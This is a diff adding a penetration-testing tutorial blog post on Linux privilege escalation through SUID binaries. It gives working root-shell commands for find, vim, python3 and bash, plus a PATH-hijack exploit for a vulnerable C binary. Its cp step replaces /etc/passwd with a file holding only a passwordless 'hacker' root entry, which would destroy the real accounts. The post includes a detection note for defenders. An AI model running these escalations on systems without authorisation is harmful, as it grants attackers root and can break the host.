@@ -1,0 +1,116 @@
+---
+title: "Linux Privilege Escalation: SUID Binaries"
+description: "A practical guide to finding and exploiting SUID binaries for privilege escalation on Linux systems."
+date: 2024-12-10
+tags: ["linux", "privesc", "pentest"]
+---
+
+import Callout from '../../components/Callout.astro';
+
+## What is SUID?
+
+The **Set User ID** (SUID) bit is a Linux permission flag that allows a binary to run with the privileges of its *owner* rather than the user executing it. When set on a binary owned by root, it runs as root — regardless of who launched it.
+
+```bash
+# Files with SUID bit set appear with 's' in permissions
+-rwsr-xr-x 1 root root 44808 /usr/bin/passwd
+#   ^--- 's' here means SUID is set
+```
+
+## Finding SUID Binaries
+
+```bash
+# Find all SUID binaries on the system
+find / -perm -4000 -type f 2>/dev/null
+
+# More targeted: only in common locations
+find /usr /bin /sbin -perm -4000 -type f 2>/dev/null
+```
+
+<Callout type="warning">
+Always check findings against [GTFOBins](https://gtfobins.github.io/) — a curated list of Unix binaries that can be abused for privilege escalation.
+</Callout>
+
+## Common Exploitable Binaries
+
+### `find`
+
+```bash
+# If find has SUID bit:
+find . -exec /bin/sh -p \; -quit
+# -p flag preserves elevated privileges in some shells
+```
+
+### `vim` / `vi`
+
+```bash
+vim -c ':!/bin/sh'
+# Inside vim:
+:set shell=/bin/sh
+:shell
+```
+
+### `python` / `python3`
+
+```bash
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+### `bash` (misconfigured)
+
+```bash
+# Only works if bash itself has SUID — rare but catastrophic
+bash -p
+# -p: don't drop privileges
+```
+
+### `cp`
+
+```bash
+# Overwrite /etc/passwd with a version containing a passwordless root entry
+echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd
+cp /tmp/passwd /etc/passwd
+su hacker
+```
+
+## Custom SUID Binary (C)
+
+Sometimes you find a custom SUID binary with a command injection vulnerability:
+
+```c
+// Vulnerable: uses system() with unsanitized input
+#include <stdlib.h>
+void main() {
+    setuid(0);
+    system("ps");   // PATH not hardcoded!
+}
+```
+
+Exploit by hijacking `PATH`:
+
+```bash
+# Create a malicious 'ps' in /tmp
+echo '/bin/bash -p' > /tmp/ps
+chmod +x /tmp/ps
+
+# Prepend /tmp to PATH so our fake 'ps' runs first
+export PATH=/tmp:$PATH
+
+# Run the vulnerable binary
+/opt/vuln_binary
+# root shell!
+```
+
+<Callout type="danger" title="Detection">
+Blue teamers: monitor for `find / -perm -4000` executions, unexpected SUID modifications (`inotifywait`), and shells spawned from unusual parent processes.
+</Callout>
+
+## Checklist
+
+When you land on a Linux box, run through this SUID checklist:
+
+1. `find / -perm -4000 2>/dev/null` — enumerate all SUID binaries
+2. Cross-reference with GTFOBins
+3. Check for custom/unusual binaries in `/opt`, `/usr/local`, `/home`
+4. Inspect custom binaries with `strings`, `ltrace`, `strace`
+5. Look for relative path calls in `system()` → PATH hijack opportunity
